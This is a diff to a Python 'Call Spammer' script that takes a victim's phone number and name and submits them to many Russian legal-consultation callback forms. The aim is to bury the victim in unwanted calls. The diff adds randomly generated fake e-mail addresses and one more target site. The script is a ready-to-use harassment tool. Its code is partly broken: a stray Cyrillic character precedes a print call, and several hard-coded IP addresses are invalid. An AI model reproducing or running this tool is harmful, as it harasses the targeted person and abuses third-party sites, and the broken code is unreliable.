@@ -4,7 +4,7 @@
 class callspam:
 	def main(self):
 		print('8888888888888888888888888\n8888888888888888888888888\n888        888        888\n888  888888888  8888  888\n888  888888888  888888888\n888  888888888  888888888\n888        888        888\n888  888888888888888  888\n888  888888888888888  888\n888  888888888  8888  888\n888  888888888        888\n8888888888888888888888888\n8888888888888888888888888\n8888    FSystem88    8888\n8888  Call Spammer!  8888\n8888      v.0.1      8888\n8888    beta test    8888\n8888888888888888888888888\n8888888888888888888888888\n')
-		import requests, datetime, sys, time, argparse
+		import requests, random, datetime, sys, time, argparse
 		parser = argparse.ArgumentParser(prog='callspam', description="Fucking shit by FSystem88. Возможно что-то уже не работает. Только для России!",epilog='Мой номер: +79153509908 (Москва) или e-mail - FSystem88@bk.ru')
 		parser.add_argument('phonenum', metavar='phone', help='Телефонный номер жертвы (пример: 79153509908)')
 		parser.add_argument('--name', help='Имя жертвы (по умолчанию: Саша)')
@@ -33,9 +33,12 @@ class callspam:
 		_name = args.name
 		_text = args.text
 		_phone = args.phonenum
+		_email = ''
+		for x in range(12):
+			_email = _email + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
 		_phoneVodaonline = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '+7 (915) 666-99-33'
 		_phoneBukvaprava = _phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11] # '7(915)350-99-99'
-		print(showstatus(wrapsbrace('info', True) + ('Жертва: +{}').format(_phone)))
+		print(showstatus(wrapsbrace('info', True) + ('Жертва: +{}').format(_phone)))				  # '+7 (888) 888-88-88
 		print('Спамер запущен.\nОтправка. Пожалуйста подождите...')
 		if _phone == '79153509908':
 			print('Error 570984')
@@ -53,11 +56,11 @@ class callspam:
 			gosur = requests.post('https://www.gos-ur.ru/zayavka/', data={'name': _name,'phone': _phone[4:11],'question': _text,'code':_phone[1:4],'type':'exit'})
 			nicecream = requests.post('http://s1.nice-cream.ru/phone-widget2/sendRequest.php', data={'phone': '+'+_phone,'name': _name,'sid': '*','gclid': '0','openstat': 'direct.yandex.ru;12345678;123456789;yandex.ru:premium','utm':''})
 			rossovet = requests.post('https://rossovet.ru/qa/msgsave/save', data={'name': _name, 'comment': _text, 'city': 'Москва', 'phoneprefix': '('+_phone[1:40]+')', 'phone': _phone[4:11], 'partnerID': '10', 'ref': 'https://yandex.ru/clck/', 'number1': '7', 'number2': '8', 'checkcode': '15'})
-			yurkonsult = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
-			epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'}
-
+			yuridkons = requests.post('https://yuridicheskaya-konsultaciya.com/Home/_FormPost', data={'Name': _name, 'Phone': _phone, 'Description': _text})
+			epleads = requests.post('https://epleads.ru/gate/api.php', data={'question': _text,'region': 'Москва','first_last_name': _name,'phone': _phone,'ofrid': '1','wid': '3','presetid': '4','referer': 'https://potreb-prava.com/konsultaciya-yurista/konsultaciya-onlajn-yurista-besplatno-kruglosutochno.html','ip': '213.154.55.496','mobile': '0','template': 'form_master.new.fix.metrik_lawyer-blue-default','product': 'lawyer','userSoftData': '*'})
+			rdftgbhnj = requests.post('https://pravonedv.ru/proxy_8d34201a5b.php?a___=1', data={'email': _email+'@mail.ru','phone': _phoneVodaonline,'location': 'Москва, Россия','name': _name,'offer': '0','ip': '263.87.162.98','device': 'desktop','token': '*','template': 'two_page3','referrer': 'https://yandex.ru/clck/','domain': 'pravonedv.ru','wm_id': '548','url': 'https://pravonedv.ru/besplatnye-onlajn-konsultacii-yurista'})
 			
-			#скоро добавлю еще... Ждите
-			print('Готово!') 
+			
+			ыprint('Готово!')
 spammer = callspam()
 spammer.main()
